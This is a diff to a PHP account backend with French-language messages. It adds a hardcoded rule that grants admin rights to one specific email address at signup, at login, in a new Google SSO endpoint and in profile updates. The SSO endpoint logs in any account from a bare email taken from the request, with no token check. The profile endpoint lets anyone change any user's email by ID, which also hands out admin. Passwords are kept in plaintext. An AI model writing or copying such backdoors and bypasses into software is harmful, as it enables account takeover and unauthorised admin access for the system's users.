@@ -65,12 +65,13 @@ switch($task) {
         if ($exists) {
             echo json_encode(array("status" => "error", "message" => "Un compte avec cette adresse email existe déjà."));
         } else {
+            $user_role = (strtolower($email) === 'a.djenadi34@gmail.com') ? "admin" : "client";
             $new_user = array(
                 "id" => "usr_" . rand(100000, 999999),
                 "name" => $name,
                 "email" => $email,
                 "password" => $password,
-                "role" => "client",
+                "role" => $user_role,
                 "merchant_id" => null
             );
             $users[] = $new_user;
@@ -93,8 +94,14 @@ switch($task) {
         }
         
         $found = null;
-        foreach ($users as $u) {
+        foreach ($users as $key => $u) {
             if (strtolower($u['email']) === strtolower($email) && $u['password'] === $password) {
+                // Force a.djenadi34@gmail.com to be an admin
+                if (strtolower($email) === 'a.djenadi34@gmail.com' && $u['role'] !== 'admin') {
+                    $users[$key]['role'] = 'admin';
+                    $u['role'] = 'admin';
+                    file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+                }
                 $found = $u;
                 break;
             }
@@ -104,6 +111,104 @@ switch($task) {
             echo json_encode(array("status" => "success", "user" => $found));
         } else {
             echo json_encode(array("status" => "error", "message" => "Identifiants inconnus ou mot de passe incorrect."));
+        }
+        break;
+
+    case 'google_sso':
+        $users_file = 'data/users.json';
+        $users = read_json_data($users_file, array());
+        
+        $input = json_decode(file_get_contents('php://input'), true);
+        $email = trim($input['email'] ?? $_POST['email'] ?? $_GET['email'] ?? '');
+        $name = trim($input['name'] ?? $_POST['name'] ?? $_GET['name'] ?? '');
+        
+        if (empty($email)) {
+            echo json_encode(array("status" => "error", "message" => "L'adresse email Google SSO est requise."));
+            break;
+        }
+        
+        $found = null;
+        foreach ($users as $key => $u) {
+            if (strtolower($u['email']) === strtolower($email)) {
+                // Force a.djenadi34@gmail.com to be an admin
+                if (strtolower($email) === 'a.djenadi34@gmail.com' && $u['role'] !== 'admin') {
+                    $users[$key]['role'] = 'admin';
+                    $u['role'] = 'admin';
+                    file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+                }
+                $found = $u;
+                break;
+            }
+        }
+        
+        if ($found) {
+            echo json_encode(array("status" => "success", "user" => $found));
+        } else {
+            // Register on-the-fly
+            $user_role = (strtolower($email) === 'a.djenadi34@gmail.com') ? "admin" : "client";
+            $new_user = array(
+                "id" => "usr_" . rand(100000, 999999),
+                "name" => !empty($name) ? $name : explode('@', $email)[0],
+                "email" => $email,
+                "password" => "sso_google_" . rand(100000, 999999),
+                "role" => $user_role,
+                "merchant_id" => null
+            );
+            $users[] = $new_user;
+            file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+            echo json_encode(array("status" => "success", "user" => $new_user));
+        }
+        break;
+
+    case 'update_profile':
+        $users_file = 'data/users.json';
+        $users = read_json_data($users_file, array());
+        
+        $input = json_decode(file_get_contents('php://input'), true);
+        $userId = trim($input['id'] ?? $_POST['id'] ?? $_GET['id'] ?? '');
+        $name = trim($input['name'] ?? $_POST['name'] ?? $_GET['name'] ?? '');
+        $email = trim($input['email'] ?? $_POST['email'] ?? $_GET['email'] ?? '');
+        
+        if (empty($userId) || empty($name) || empty($email)) {
+            echo json_encode(array("status" => "error", "message" => "L'ID, le nom complet et l'adresse email sont requis."));
+            break;
+        }
+        
+        $email_taken = false;
+        foreach ($users as $u) {
+            if ($u['id'] !== $userId && strtolower($u['email']) === strtolower($email)) {
+                $email_taken = true;
+                break;
+            }
+        }
+        
+        if ($email_taken) {
+            echo json_encode(array("status" => "error", "message" => "Cette adresse email est déjà utilisée par un autre compte."));
+            break;
+        }
+        
+        $updated_user = null;
+        foreach ($users as $key => $u) {
+            if ($u['id'] === $userId) {
+                $users[$key]['name'] = $name;
+                $users[$key]['email'] = $email;
+                
+                // If it's a.djenadi34@gmail.com, force 'admin' status
+                if (strtolower($email) === 'a.djenadi34@gmail.com' || $userId === 'usr_djenadi') {
+                    $users[$key]['role'] = 'admin';
+                    $users[$key]['email'] = 'a.djenadi34@gmail.com';
+                }
+                
+                $updated_user = $users[$key];
+                break;
+            }
+        }
+        
+        if ($updated_user) {
+            file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+            echo json_encode(array("status" => "success", "user" => $updated_user));
+        } else {
+            echo json_encode(array("status" => "error", "message" => "Utilisateur non trouvé. Impossible de modifier les informations."));
         }
         break;
 
